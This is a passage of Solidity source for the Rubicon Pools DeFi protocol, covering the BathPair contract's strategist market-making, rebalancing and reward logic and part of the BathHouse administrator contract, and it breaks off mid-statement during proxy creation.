mapping(address => mapping(address => uint256[])))\n        public outOffersByStrategist;\n\n    /// @notice Tracks the market-kaing fill amounts on a per-asset basis of a strategist\n    /// @dev strategist => erc20asset => fill amount per asset;\n    mapping(address => mapping(address => uint256)) public strategist2Fills;\n\n    /// *** Structs ***\n\n    struct order {\n        uint256 pay_amt;\n        IERC20 pay_gem;\n        uint256 buy_amt;\n        IERC20 buy_gem;\n    }\n\n    struct StrategistTrade {\n        uint256 askId;\n        uint256 askPayAmt;\n        address askAsset;\n        uint256 bidId;\n        uint256 bidPayAmt;\n        address bidAsset;\n        address strategist;\n        uint256 timestamp;\n    }\n\n    /// *** Events ***\n\n    /// @notice Log a new market-making trade placed by a strategist, resulting in a StrategitTrade\n    event LogStrategistTrade(\n        uint256 strategistTradeID,\n        bytes32 askId,\n        bytes32 bidId,\n        address askAsset,\n        address bidAsset,\n        uint256 timestamp,\n        address strategist\n    );\n\n    /// @notice Logs the cancellation of a StrategistTrade\n    event LogScrubbedStratTrade(\n        uint256 strategistIDScrubbed,\n        uint256 assetFill,\n        address assetAddress,\n        address bathAssetAddress,\n        uint256 quoteFill,\n        address quoteAddress,\n        address bathQuoteAddress\n    );\n\n    /// @notice Log when a strategist claims their market-making rewards (effectively a rebate for good performance)\n    event LogStrategistRewardClaim(\n        address strategist,\n        address asset,\n        uint256 amountOfReward,\n        uint256 timestamp\n    );\n\n    /// *** External Functions ***\n\n    /// @notice Constructor-like initialization function\n    /// @dev Proxy-safe initialization of storage\n    function initialize(uint256 _maxOrderSizeBPS, int128 _shapeCoefNum)\n        external\n    {\n        require(!initialized);\n        address _bathHouse = msg.sender; //Assume the initializer is BathHouse\n        require(\n            IBathHouse(_bathHouse).getMarket() !=\n                address(0x0000000000000000000000000000000000000000) &&\n                IBathHouse(_bathHouse).initialized(),\n            \"BathHouse not initialized\"\n        );\n        bathHouse = _bathHouse;\n\n        RubiconMarketAddress = IBathHouse(_bathHouse).getMarket();\n\n        // Shape variables for dynamic inventory management\n        /// *** DEprecate but keep storage variable on OP\n        deprecatedStorageVarKept4Proxy = _maxOrderSizeBPS;\n\n        /// @dev A deprecated storage variable! Turns out order books are elegant and complex math is simply computed off-chain, and priced in on-chain orders at the speed of Ethereum L2s!\n        deprecatedStorageVarKept420Proxy = _shapeCoefNum;\n\n        initialized = true;\n    }\n\n    /// *** Modifiers ***\n\n    modifier onlyBathHouse() {\n        require(msg.sender == bathHouse);\n        _;\n    }\n\n    modifier onlyApprovedStrategist(address targetStrategist) {\n        require(\n            IBathHouse(bathHouse).isApprovedStrategist(targetStrategist) ==\n                true,\n            \"you are not an approved strategist - bathPair\"\n        );\n        _;\n    }\n\n    // *** Internal Functions ***\n\n    /// @notice This function enforces that the Bath House reserveRatio (a % of underlying pool liquidity) is enforced across all pools\n    /// @dev This function should ensure that reserveRatio % of the underlying liquidity always remains on the Bath Token. Utilization should be 1 - reserveRatio in practice assuming strategists use all available liquidity.\n    function enforceReserveRatio(\n        address underlyingAsset,\n        address underlyingQuote\n    )\n        internal\n        view\n        returns (address bathAssetAddress, address bathQuoteAddress)\n    {\n        bathAssetAddress = IBathHouse(bathHouse).tokenToBathToken(\n            underlyingAsset\n        );\n        bathQuoteAddress = IBathHouse(bathHouse).tokenToBathToken(\n            underlyingQuote\n        );\n        require(\n            (\n                IBathToken(bathAssetAddress).underlyingBalance().mul(\n                    IBathHouse(bathHouse).reserveRatio()\n                )\n            ).div(100) <= IERC20(underlyingAsset).balanceOf(bathAssetAddress),\n            \"Failed to meet asset pool reserve ratio\"\n        );\n        require(\n            (\n                IBathToken(bathQuoteAddress).underlyingBalance().mul(\n                    IBathHouse(bathHouse).reserveRatio()\n                )\n            ).div(100) <= IERC20(underlyingQuote).balanceOf(bathQuoteAddress),\n            \"Failed to meet quote pool reserve ratio\"\n        );\n    }\n\n    /// @notice Log whenever a strategist rebalances a fill amount and log the amount while incrementing total fills for that specific asset\n    /// @dev Only log fills for each strategist in an asset specific manner\n    /// @dev Goal is to map a strategist to a fill\n    function logFill(\n        uint256 amt,\n        address strategist,\n        address asset\n    ) internal {\n        strategist2Fills[strategist][asset] += amt;\n        totalFillsPerAsset[asset] += amt;\n    }\n\n    /// @notice Internal function to provide the next unique StrategistTrade ID\n    function _next_id() internal returns (uint256) {\n        last_stratTrade_id++;\n        return last_stratTrade_id;\n    }\n\n    /// @notice This function results in the removal of the Strategist Trade (bid and/or ask on Rubicon Market) from the books and it being deleted from the contract\n    /// @dev The local array of strategist IDs that exists for any given strategist [query via getOutstandingStrategistTrades()] acts as an acitve RAM for outstanding strategist trades\n    /// @dev Cancels outstanding orders and manages the ledger of outstandingAmount() on bathTokens as Strategist Trades are cancelled/scrubbed or expired\n    function handleStratOrderAtID(uint256 id) internal {\n        StrategistTrade memory info = strategistTrades[id];\n        address _asset = info.askAsset;\n        address _quote = info.bidAsset;\n\n        address bathAssetAddress = IBathHouse(bathHouse).tokenToBathToken(\n            _asset\n        );\n        address bathQuoteAddress = IBathHouse(bathHouse).tokenToBathToken(\n            _quote\n        );\n        order memory offer1 = getOfferInfo(info.askId); //ask\n        order memory offer2 = getOfferInfo(info.bidId); //bid\n        uint256 askDelta = info.askPayAmt - offer1.pay_amt;\n        uint256 bidDelta = info.bidPayAmt - offer2.pay_amt;\n\n        // if real\n        if (info.askId != 0) {\n            // if delta > 0 - delta is fill => handle any amount of fill here\n            if (askDelta > 0) {\n                logFill(askDelta, info.strategist, info.askAsset);\n                IBathToken(bathAssetAddress).removeFilledTradeAmount(askDelta);\n                // not a full fill\n                if (askDelta != info.askPayAmt) {\n                    IBathToken(bathAssetAddress).cancel(\n                        info.askId,\n                        info.askPayAmt.sub(askDelta)\n                    );\n                }\n            }\n            // otherwise didn't fill so cancel\n            else {\n                IBathToken(bathAssetAddress).cancel(info.askId, info.askPayAmt); // pas amount too\n            }\n        }\n\n        // if real\n        if (info.bidId != 0) {\n            // if delta > 0 - delta is fill => handle any amount of fill here\n            if (bidDelta > 0) {\n                logFill(bidDelta, info.strategist, info.bidAsset);\n                IBathToken(bathQuoteAddress).removeFilledTradeAmount(bidDelta);\n                // not a full fill\n                if (bidDelta != info.bidPayAmt) {\n                    IBathToken(bathQuoteAddress).cancel(\n                        info.bidId,\n                        info.bidPayAmt.sub(bidDelta)\n                    );\n                }\n            }\n            // otherwise didn't fill so cancel\n            else {\n                IBathToken(bathQuoteAddress).cancel(info.bidId, info.bidPayAmt); // pass amount too\n            }\n        }\n\n        // Delete the order from outOffersByStrategist\n        uint256 target = getIndexFromElement(\n            id,\n            outOffersByStrategist[_asset][_quote][info.strategist]\n        );\n        uint256[] storage current = outOffersByStrategist[_asset][_quote][\n            info.strategist\n        ];\n        current[target] = current[current.length - 1];\n        current.pop(); // Assign the last value to the value we want to delete and pop, best way to do this in solc AFAIK\n\n        emit LogScrubbedStratTrade(\n            id,\n            askDelta,\n            _asset,\n            bathAssetAddress,\n            bidDelta,\n            _quote,\n            bathQuoteAddress\n        );\n    }\n\n    /// @notice Get information about a Rubicon Market offer and return it as an order\n    function getOfferInfo(uint256 id) internal view returns (order memory) {\n        (\n            uint256 ask_amt,\n            IERC20 ask_gem,\n            uint256 bid_amt,\n            IERC20 bid_gem\n        ) = IRubiconMarket(RubiconMarketAddress).getOffer(id);\n        order memory offerInfo = order(ask_amt, ask_gem, bid_amt, bid_gem);\n        return offerInfo;\n    }\n\n    /// @notice A function that returns the index of uid from array\n    /// @dev uid must be in array for the purposes of this contract to enforce outstanding trades per strategist are tracked correctly\n    function getIndexFromElement(uint256 uid, uint256[] storage array)\n        internal\n        view\n        returns (uint256 _index)\n    {\n        bool assigned = false;\n        for (uint256 index = 0; index < array.length; index++) {\n            if (uid == array[index]) {\n                _index = index;\n                assigned = true;\n                return _index;\n            }\n        }\n        require(assigned, \"Didnt Find that element in live list, cannot scrub\");\n    }\n\n    // *** External Functions - Only Approved Strategists ***\n\n    /// @notice Key entry point for strategists to use Bath Token (LP) funds to place market-making trades on the Rubicon Order Book\n    function placeMarketMakingTrades(\n        address[2] memory tokenPair, // ASSET, Then Quote\n        uint256 askNumerator, // Quote / Asset\n        uint256 askDenominator, // Asset / Quote\n        uint256 bidNumerator, // size in ASSET\n        uint256 bidDenominator // size in QUOTES\n    ) public onlyApprovedStrategist(msg.sender) returns (uint256 id) {\n        // Require at least one order is non-zero\n        require(\n            (askNumerator > 0 && askDenominator > 0) ||\n                (bidNumerator > 0 && bidDenominator > 0),\n            \"one order must be non-zero\"\n        );\n\n        address _underlyingAsset = tokenPair[0];\n        address _underlyingQuote = tokenPair[1];\n\n        (\n            address bathAssetAddress,\n            address bathQuoteAddress\n        ) = enforceReserveRatio(_underlyingAsset, _underlyingQuote);\n\n        require(\n            bathAssetAddress != address(0) && bathQuoteAddress != address(0),\n            \"tokenToBathToken error\"\n        );\n\n        // Calculate new bid and/or ask\n        order memory ask = order(\n            askNumerator,\n            IERC20(_underlyingAsset),\n            askDenominator,\n            IERC20(_underlyingQuote)\n        );\n        order memory bid = order(\n            bidNumerator,\n            IERC20(_underlyingQuote),\n            bidDenominator,\n            IERC20(_underlyingAsset)\n        );\n\n        // Place new bid and/or ask\n        // Note: placeOffer returns a zero if an incomplete order\n        uint256 newAskID = IBathToken(bathAssetAddress).placeOffer(\n            ask.pay_amt,\n            ask.pay_gem,\n            ask.buy_amt,\n            ask.buy_gem\n        );\n\n        uint256 newBidID = IBathToken(bathQuoteAddress).placeOffer(\n            bid.pay_amt,\n            bid.pay_gem,\n            bid.buy_amt,\n            bid.buy_gem\n        );\n\n        // Strategist trade is recorded so they can get paid and the trade is logged for time\n        StrategistTrade memory outgoing = StrategistTrade(\n            newAskID,\n            ask.pay_amt,\n            _underlyingAsset,\n            newBidID,\n            bid.pay_amt,\n            _underlyingQuote,\n            msg.sender,\n            block.timestamp\n        );\n\n        // Give each trade a unique id for easy handling by strategists\n        id = _next_id();\n        strategistTrades[id] = outgoing;\n        // Allow strategists to easily call a list of their outstanding offers\n        outOffersByStrategist[_underlyingAsset][_underlyingQuote][msg.sender]\n            .push(id);\n\n        emit LogStrategistTrade(\n            id,\n            bytes32(outgoing.askId),\n            bytes32(outgoing.bidId),\n            outgoing.askAsset,\n            outgoing.bidAsset,\n            block.timestamp,\n            outgoing.strategist\n        );\n    }\n\n    /// @notice A function to batch together many placeMarketMakingTrades() in a single transaction\n    function batchMarketMakingTrades(\n        address[2] memory tokenPair, // ASSET, Then Quote\n        uint256[] memory askNumerators, // Quote / Asset\n        uint256[] memory askDenominators, // Asset / Quote\n        uint256[] memory bidNumerators, // size in ASSET\n        uint256[] memory bidDenominators // size in QUOTES\n    ) external onlyApprovedStrategist(msg.sender) {\n        require(\n            askNumerators.length == askDenominators.length &&\n                askDenominators.length == bidNumerators.length &&\n                bidNumerators.length == bidDenominators.length,\n            \"not all order lengths match\"\n        );\n        uint256 quantity = askNumerators.length;\n\n        for (uint256 index = 0; index < quantity; index++) {\n            placeMarketMakingTrades(\n                tokenPair,\n                askNumerators[index],\n                askDenominators[index],\n                bidNumerators[index],\n                bidDenominators[index]\n            );\n        }\n    }\n\n    /// @notice A function to requote an outstanding order and replace it with a new Strategist Trade\n    /// @dev Note that this function will create a new unique id for the requote'd ID due to the low-level functionality\n    function requote(\n        uint256 id,\n        address[2] memory tokenPair, // ASSET, Then Quote\n        uint256 askNumerator, // Quote / Asset\n        uint256 askDenominator, // Asset / Quote\n        uint256 bidNumerator, // size in ASSET\n        uint256 bidDenominator // size in QUOTES\n    ) public onlyApprovedStrategist(msg.sender) {\n        // 1. Scrub strat trade\n        scrubStrategistTrade(id);\n\n        // 2. Place another\n        placeMarketMakingTrades(\n            tokenPair,\n            askNumerator,\n            askDenominator,\n            bidNumerator,\n            bidDenominator\n        );\n    }\n\n    /// @notice A function to batch together many requote() calls in a single transaction\n    /// @dev Ids and input are indexed through to execute requotes\n    function batchRequoteOffers(\n        uint256[] memory ids,\n        address[2] memory tokenPair, // ASSET, Then Quote\n        uint256[] memory askNumerators, // Quote / Asset\n        uint256[] memory askDenominators, // Asset / Quote\n        uint256[] memory bidNumerators, // size in ASSET\n        uint256[] memory bidDenominators // size in QUOTES\n    ) external onlyApprovedStrategist(msg.sender) {\n        require(\n            askNumerators.length == askDenominators.length &&\n                askDenominators.length == bidNumerators.length &&\n                bidNumerators.length == bidDenominators.length &&\n                ids.length == askNumerators.length,\n            \"not all input lengths match\"\n        );\n        uint256 quantity = askNumerators.length;\n\n        for (uint256 index = 0; index < quantity; index++) {\n            requote(\n                ids[index],\n                tokenPair,\n                askNumerators[index],\n                askDenominators[index],\n                bidNumerators[index],\n                bidDenominators[index]\n            );\n        }\n    }\n\n    /// @notice - function to rebalance fill between two pools\n    function rebalancePair(\n        uint256 assetRebalAmt, //amount of ASSET in the quote buffer\n        uint256 quoteRebalAmt, //amount of QUOTE in the asset buffer\n        address _underlyingAsset,\n        address _underlyingQuote\n    ) external onlyApprovedStrategist(msg.sender) {\n        address _bathHouse = bathHouse;\n        address _bathAssetAddress = IBathHouse(_bathHouse).tokenToBathToken(\n            _underlyingAsset\n        );\n        address _bathQuoteAddress = IBathHouse(_bathHouse).tokenToBathToken(\n            _underlyingQuote\n        );\n        require(\n            _bathAssetAddress != address(0) && _bathQuoteAddress != address(0),\n            \"tokenToBathToken error\"\n        );\n\n        // This should be localized to the bathToken in future versions\n        uint16 stratReward = IBathHouse(_bathHouse).getBPSToStrats();\n\n        // Simply rebalance given amounts\n        if (assetRebalAmt > 0) {\n            IBathToken(_bathQuoteAddress).rebalance(\n                _bathAssetAddress,\n                _underlyingAsset,\n                stratReward,\n                assetRebalAmt\n            );\n        }\n        if (quoteRebalAmt > 0) {\n            IBathToken(_bathAssetAddress).rebalance(\n                _bathQuoteAddress,\n                _underlyingQuote,\n                stratReward,\n                quoteRebalAmt\n            );\n        }\n    }\n\n    /// @notice Function to attempt inventory risk tail off on an AMM\n    /// @dev This function calls the strategist utility which handles the trade and returns funds to LPs\n    function tailOff(\n        address targetPool,\n        address tokenToHandle,\n        address targetToken,\n        address _stratUtil, // delegatecall target\n        uint256 amount, //fill amount to handle\n        uint256 hurdle, //must clear this on tail off\n        uint24 _poolFee\n    ) external onlyApprovedStrategist(msg.sender) {\n        // transfer here\n        uint16 stratRewardBPS = IBathHouse(bathHouse).getBPSToStrats();\n\n        IBathToken(targetPool).rebalance(\n            _stratUtil,\n            tokenToHandle,\n            stratRewardBPS,\n            amount\n        );\n\n        // Should always exceed hurdle given amountOutMinimum\n        IStrategistUtility(_stratUtil).UNIdump(\n            amount.sub((stratRewardBPS.mul(amount)).div(10000)),\n            tokenToHandle,\n            targetToken,\n            hurdle,\n            _poolFee,\n            targetPool\n        );\n    }\n\n    /// @notice Cancel an outstanding strategist offers and return funds to LPs while logging fills\n    function scrubStrategistTrade(uint256 id)\n        public\n        onlyApprovedStrategist(msg.sender)\n    {\n        require(\n            msg.sender == strategistTrades[id].strategist,\n            \"you are not the strategist that made this order\"\n        );\n        handleStratOrderAtID(id);\n    }\n\n    /// @notice Batch scrub outstanding strategist trades and return funds to LPs\n    function scrubStrategistTrades(uint256[] memory ids)\n        external\n        onlyApprovedStrategist(msg.sender)\n    {\n        for (uint256 index = 0; index < ids.length; index++) {\n            uint256 _id = ids[index];\n            scrubStrategistTrade(_id);\n        }\n    }\n\n    /// @notice Function where strategists claim rewards proportional to their quantity of fills\n    /// @dev This function should allow a strategist to claim ERC20s sitting on this contract (earned via rebalancing) relative to their share or strategist activity on the pair\n    /// @dev Provide the pair on which you want to claim rewards\n    function strategistBootyClaim(address asset, address quote)\n        external\n        onlyApprovedStrategist(msg.sender)\n    {\n        uint256 fillCountA = strategist2Fills[msg.sender][asset];\n        uint256 fillCountQ = strategist2Fills[msg.sender][quote];\n        if (fillCountA > 0) {\n            uint256 booty = (\n                fillCountA.mul(IERC20(asset).balanceOf(address(this)))\n            ).div(totalFillsPerAsset[asset]);\n            IERC20(asset).transfer(msg.sender, booty);\n            emit LogStrategistRewardClaim(\n                msg.sender,\n                asset,\n                booty,\n                block.timestamp\n            );\n            totalFillsPerAsset[asset] -= fillCountA;\n            strategist2Fills[msg.sender][asset] -= fillCountA;\n        }\n        if (fillCountQ > 0) {\n            uint256 booty = (\n                fillCountQ.mul(IERC20(quote).balanceOf(address(this)))\n            ).div(totalFillsPerAsset[quote]);\n            IERC20(quote).transfer(msg.sender, booty);\n            emit LogStrategistRewardClaim(\n                msg.sender,\n                quote,\n                booty,\n                block.timestamp\n            );\n            totalFillsPerAsset[quote] -= fillCountQ;\n            strategist2Fills[msg.sender][quote] -= fillCountQ;\n        }\n    }\n\n    /// *** View Functions ***\n\n    /// @notice The goal of this function is to enable a means to retrieve all outstanding orders a strategist has live in the books\n    /// @dev This is helpful to manage orders as well as track all strategist orders (like their RAM of StratTrade IDs) and place any would-be constraints on strategists\n    function getOutstandingStrategistTrades(\n        address asset,\n        address quote,\n        address strategist\n    ) public view returns (uint256[] memory) {\n        return outOffersByStrategist[asset][quote][strategist];\n    }\n}\n\n\n// SPDX-License-Identifier: BUSL-1.1\n\n/// @title  The administrator contract of Rubicon Pools\n/// @author Rubicon DeFi Inc. - bghughes.eth\n/// @notice The BathHouse initializes proxy-wrapped bathTokens, manages approved strategists, and sets system variables\n\npragma solidity =0.7.6;\n\nimport \"./BathToken.sol\";\nimport \"../interfaces/IBathPair.sol\";\nimport \"../interfaces/IBathToken.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/proxy/TransparentUpgradeableProxy.sol\";\n\ncontract BathHouse {\n    /// *** Storage Variables ***\n\n    /// @notice Rubicon Bath House\n    string public name;\n\n    /// @notice The administrator of the Bath House contract\n    address public admin;\n\n    /// @notice The proxy administrator of Bath Tokens\n    address public proxyManager;\n\n    /// @notice The core Rubicon Market of the Pools system\n    address public RubiconMarketAddress;\n\n    /// @notice A mapping of approved strategists to access Pools liquidity\n    mapping(address => bool) public approvedStrategists;\n\n    /// @notice The initialization status of BathHouse\n    bool public initialized;\n\n    /// @notice If true, strategists are permissioned and must be approved by admin\n    bool public permissionedStrategists;\n\n    /// @notice Key, system-wide risk parameter for all liquity Pools\n    /// @notice This represents the proportion of a pool's underlying assets that must remain in the pool\n    /// @dev This protects a run on the bank scenario and ensures users can withdraw while allowing funds to be utilized for yield in the market\n    uint256 public reserveRatio;\n\n    /// @notice A variable time delay after which a strategist must return funds to the Bath Token\n    uint256 public timeDelay;\n\n    /// @notice The lone Bath Pair contract of the system which acts as the strategist entry point and logic contract\n    address public approvedPairContract;\n\n    /// @notice The basis point fee that is paid to strategists from LPs on capital that is successfully rebalanced to a Bath Token\n    uint8 public bpsToStrategists;\n\n    /// @notice Key mapping for determining the address of a Bath Token based on its underlying asset\n    /// @dev Source of truth mapping that logs all ERC20 Liquidity pools underlying asset => bathToken Address\n    mapping(address => address) public tokenToBathToken;\n\n    /// @notice The BathToken.sol implementation that any new bathTokens inherit\n    /// @dev The implementation of any ~newly spawned~ proxy-wrapped Bath Tokens via _createBathToken\n    address public newBathTokenImplementation;\n\n    /// *** Events ***\n\n    /// @notice An event that signals the creation of a new Bath Token\n    event LogNewBathToken(\n        address underlyingToken,\n        address bathTokenAddress,\n        address bathTokenFeeAdmin,\n        uint256 timestamp,\n        address bathTokenCreator\n    );\n\n    /// @notice An event that signals the permissionless spawning of a new Bath Token\n    event LogOpenCreationSignal(\n        ERC20 newERC20Underlying,\n        address spawnedBathToken,\n        uint256 initialNewBathTokenDeposit,\n        ERC20 pairedExistingAsset,\n        address pairedExistingBathToken,\n        uint256 pairedBathTokenDeposit,\n        address signaler\n    );\n\n    /// *** Modifiers ***\n\n    /// @notice This modifier enforces that only the admin can call these functions\n    modifier onlyAdmin() {\n        require(msg.sender == admin);\n        _;\n    }\n\n    /// *** External Functions ***\n\n    /// @notice The constructor-like initialization function\n    /// @dev Proxy-safe initialization of storage that sets key storage variables\n    /// @dev Admin is set to msg.sender\n    function initialize(\n        address market,\n        uint256 _reserveRatio,\n        uint256 _timeDelay,\n        address _newBathTokenImplementation,\n        address _proxyAdmin\n    ) external {\n        require(!initialized);\n        name = \"Rubicon Bath House\";\n        admin = msg.sender;\n        timeDelay = _timeDelay;\n\n        // Set Bath Token reserve ratio globally\n        require(_reserveRatio <= 100);\n        require(_reserveRatio > 0);\n        reserveRatio = _reserveRatio;\n\n        // Set BPS reward fee for successful strategist market-making\n        /// @notice [(10000 - {bpsToStrategists}) / 10000] BPS of MM-ing activity is passed to users\n        bpsToStrategists = 20;\n\n        // Set key storage variables\n        RubiconMarketAddress = market;\n        permissionedStrategists = true;\n        newBathTokenImplementation = _newBathTokenImplementation;\n        proxyManager = _proxyAdmin;\n\n        // Automatically approve admin as an approved strategist\n        approveStrategist(admin);\n\n        // Complete contract instantiation\n        initialized = true;\n    }\n\n    /// @notice Permissionless entry point to spawn a Bath Token while posting liquidity to a ~pair of Bath Tokens~\n    /// @notice Please note, creating a Bath Token in this fashion ~does not~ gaurentee markets will be made for the new pair. This function signals the desire to have a new pair supported on Rubicon for strategists to consider market-making for\n    /// @notice The best desiredPairedAsset to select is a popular quote currency. Many traditional systems quote in USD while the ETH quote is superior - the choice is yours sweet msg.sender\n    /// @dev The user must approve the bathHouse to spend their ERC20s\n    /// @dev The user can only spawn a Bath Token for an ERC20 that is not yet in the Pools system and they must post liquidity on the other side of the pair for an ~extant Bath Token~\n    function openBathTokenSpawnAndSignal(\n        ERC20 newBathTokenUnderlying,\n        uint256 initialLiquidityNew, // Must approve this contract to spend\n        ERC20 desiredPairedAsset, // Must be paired with an existing quote for v1\n        uint256 initialLiquidityExistingBathToken\n    ) external returns (address newBathToken) {\n        // Check that it doesn't already exist\n        require(\n            getBathTokenfromAsset(newBathTokenUnderlying) == address(0),\n            \"bathToken already exists for that ERC20\"\n        );\n        require(\n            getBathTokenfromAsset(desiredPairedAsset) != address(0),\n            \"bathToken does not exist for that desiredPairedAsset\"\n        );\n\n        // Spawn a bathToken for the new asset\n        address newOne = _createBathToken(newBathTokenUnderlying, address(0)); // NOTE: address(0) as feeAdmin means fee is paid to pool holders\n\n        // Deposit initial liquidity posted of newBathTokenUnderlying\n        require(\n            newBathTokenUnderlying.transferFrom(\n                msg.sender,\n                address(this),\n                initialLiquidityNew\n            ),\n            \"Couldn't transferFrom your initial liquidity - make sure to approve BathHouse.sol\"\n        );\n\n        newBathTokenUnderlying.approve(newOne, initialLiquidityNew);\n\n        // Deposit assets and send Bath Token shares to msg.sender\n        IBathToken(newOne).deposit(initialLiquidityNew, msg.sender);\n\n        // desiredPairedAsset must be pulled and deposited into bathToken\n        require(\n            desiredPairedAsset.transferFrom(\n                msg.sender,\n                address(this),\n                initialLiquidityExistingBathToken\n            ),\n            \"Couldn't transferFrom your initial liquidity - make sure to approve BathHouse.sol\"\n        );\n        address pairedPool = getBathTokenfromAsset((desiredPairedAsset));\n        desiredPairedAsset.approve(\n            pairedPool,\n            initialLiquidityExistingBathToken\n        );\n\n        // Deposit assets and send Bath Token shares to msg.sender\n        IBathToken(pairedPool).deposit(\n            initialLiquidityExistingBathToken,\n            msg.sender\n        );\n\n        // emit an event describing the new pair, underlyings and bathTokens\n        emit LogOpenCreationSignal(\n            newBathTokenUnderlying,\n            newOne,\n            initialLiquidityNew,\n            desiredPairedAsset,\n            pairedPool,\n            initialLiquidityExistingBathToken,\n            msg.sender\n        );\n\n        newBathToken = newOne;\n    }\n\n    /// ** Admin-Only Functions **\n\n    /// @notice An admin-only function to create a new Bath Token for any ERC20\n    function createBathToken(ERC20 underlyingERC20, address _feeAdmin)\n        external\n        onlyAdmin\n        returns (address newBathTokenAddress)\n    {\n        newBathTokenAddress = _createBathToken(underlyingERC20, _feeAdmin);\n    }\n\n    /// @notice A migration function that allows the admin to write arbitrarily to tokenToBathToken\n    function adminWriteBathToken(ERC20 overwriteERC20, address newBathToken)\n        external\n        onlyAdmin\n    {\n        tokenToBathToken[address(overwriteERC20)] = newBathToken;\n        emit LogNewBathToken(\n            address(overwriteERC20),\n            newBathToken,\n            address(0),\n            block.timestamp,\n            msg.sender\n        );\n    }\n\n    /// @notice Function to initialize and store the address of the ~lone~ bathPair contract for the Rubicon protocol\n    function initBathPair(\n        address _bathPairAddress,\n        uint256 _maxOrderSizeBPS,\n        int128 _shapeCoefNum\n    ) external onlyAdmin returns (address newPair) {\n        require(\n            approvedPairContract == address(0),\n            \"BathPair already approved\"\n        );\n        require(\n            IBathPair(_bathPairAddress).initialized() != true,\n            \"BathPair already initialized\"\n        );\n        newPair = _bathPairAddress;\n\n        IBathPair(newPair).initialize(_maxOrderSizeBPS, _shapeCoefNum);\n\n        approvedPairContract = newPair;\n    }\n\n    /// @notice Admin-only function to set a new Admin\n    function setBathHouseAdmin(address newAdmin) external onlyAdmin {\n        admin = newAdmin;\n    }\n\n    /// @notice Admin-only function to set a new Bath Token implementation\n    /// @dev Please note that all bathTokens created will use this abi\n    function setNewBathTokenImplementation(address newImplementation) external onlyAdmin {\n        newBathTokenImplementation = newImplementation;\n    }\n\n    /// @notice Admin-only function to approve a new permissioned strategist\n    function approveStrategist(address strategist) public onlyAdmin {\n        approvedStrategists[strategist] = true;\n    }\n\n    /// @notice Admin-only function to set whether or not strategists are permissioned\n    function setPermissionedStrategists(bool _new) external onlyAdmin {\n        permissionedStrategists = _new;\n    }\n\n    /// @notice Admin-only function to set timeDelay\n    function setCancelTimeDelay(uint256 value) external onlyAdmin {\n        timeDelay = value;\n    }\n\n    /// @notice Admin-only function to set reserveRatio\n    function setReserveRatio(uint256 rr) external onlyAdmin {\n        require(rr <= 100);\n        require(rr > 0);\n        reserveRatio = rr;\n    }\n\n    /// @notice Admin-only function to set a Bath Token's timeDelay\n    function setBathTokenMarket(address bathToken, address newMarket)\n        external\n        onlyAdmin\n    {\n        IBathToken(bathToken).setMarket(newMarket);\n    }\n\n    /// @notice Admin-only function to add a bonus token to a Bath Token's reward schema\n    function setBonusToken(address bathToken, address newBonusToken)\n        external\n        onlyAdmin\n    {\n        IBathToken(bathToken).setBonusToken(newBonusToken);\n    }\n\n    /// @notice Admin-only function to set a Bath Token's Bath House admin\n    function setBathTokenBathHouse(address bathToken, address newAdmin)\n        external\n        onlyAdmin\n    {\n        IBathToken(bathToken).setBathHouse(newAdmin);\n    }\n\n    /// @notice Admin-only function to set a Bath Token's feeBPS\n    function setBathTokenFeeBPS(address bathToken, uint256 newBPS)\n        external\n        onlyAdmin\n    {\n        IBathToken(bathToken).setFeeBPS(newBPS);\n    }\n\n    /// @notice Admin-only function to approve the Bath Token's underlying token on the assigned market\n    /// @dev required in case the market address ever changes.. #battleScars\n    function bathTokenApproveSetMarket(address targetBathToken)\n        external\n        onlyAdmin\n    {\n        IBathToken(targetBathToken).approveMarket();\n    }\n\n    /// @notice Admin-only function to set a Bath Token's fee recipient (typically the Bath Token itself)\n    function setBathTokenFeeTo(address bathToken, address feeTo)\n        external\n        onlyAdmin\n    {\n        IBathToken(bathToken).setFeeTo(feeTo);\n    }\n\n    /// @notice Admin-only function to set a Bath Token's target Rubicon Market\n    function setMarket(address newMarket) external onlyAdmin {\n        RubiconMarketAddress = newMarket;\n    }\n\n    /// *** View Functions ***\n\n    // Getter Functions for parameters\n    function getMarket() external view returns (address) {\n        return RubiconMarketAddress;\n    }\n\n    function getReserveRatio() external view returns (uint256) {\n        return reserveRatio;\n    }\n\n    function getCancelTimeDelay() external view returns (uint256) {\n        return timeDelay;\n    }\n\n    /// @notice Returns the address of any bathToken in the system based on its corresponding underlying asset\n    function getBathTokenfromAsset(ERC20 asset) public view returns (address) {\n        return tokenToBathToken[address(asset)];\n    }\n\n    function getBPSToStrats() public view returns (uint8) {\n        return bpsToStrategists;\n    }\n\n    /// *** System Security Checks ***\n\n    /// @notice A function to check whether or not an address is an approved strategist\n    function isApprovedStrategist(address wouldBeStrategist)\n        external\n        view\n        returns (bool)\n    {\n        if (\n            approvedStrategists[wouldBeStrategist] == true ||\n            !permissionedStrategists\n        ) {\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    /// @notice A function to check whether or not an address is the approved system instance of BathPair.sol\n    function isApprovedPair(address pair) public view returns (bool outcome) {\n        pair == approvedPairContract ? outcome = true : outcome = false;\n    }\n\n    /// *** Internal Functions ***\n\n    /// @dev Low-level functionality to spawn a Bath Token using the OZ Transparent Upgradeable Proxy standard\n    /// @param underlyingERC20 The underlying ERC-20 asset that underlies the newBathTokenAddress\n    /// @param _feeAdmin Recipient of pool withdrawal fees, typically the pool itself\n    function _createBathToken(ERC20 underlyingERC20, address _feeAdmin)\n        internal\n        returns (address newBathTokenAddress)\n    {\n        require(initialized, \"BathHouse not initialized\");\n        address _underlyingERC20 = address(underlyingERC20);\n        require(\n            _underlyingERC20 != address(0),\n            \"Cant create bathToken for zero address\"\n        );\n\n        // Check that it isn't already logged in the registry\n        require(\n            tokenToBathToken[_underlyingERC20] == address(0),\n            \"bathToken already exists\"\n        );\n\n        // Creates a new bathToken that is upgradeable by the proxyManager\n        require(\n            newBathTokenImplementation != address(0),\n            \"no implementation set for bathTokens\"\n        );\n\n        // Note, the option of a fee recipient for pool withdrawls exists. For all pools this is set to the pool itself in production and is visible via ~feeTo~ on any respective contract\n        // Note, fee admin presently ignored in the Bath Token initialization() call via defaulting to itself; though, this is still upgradeable by the Bath House admin via\n        bytes memory _initData = abi.encodeWithSignature(\n            \"initialize(address,address,address)\",\n            _underlyingERC20,\n            (RubiconMarketAddress),\n            (_feeAdmin)\n        );\n\n\n            TransparentUpgradeableProxy newBathToken\n         = new TransparentUpgradeableProxy(\n            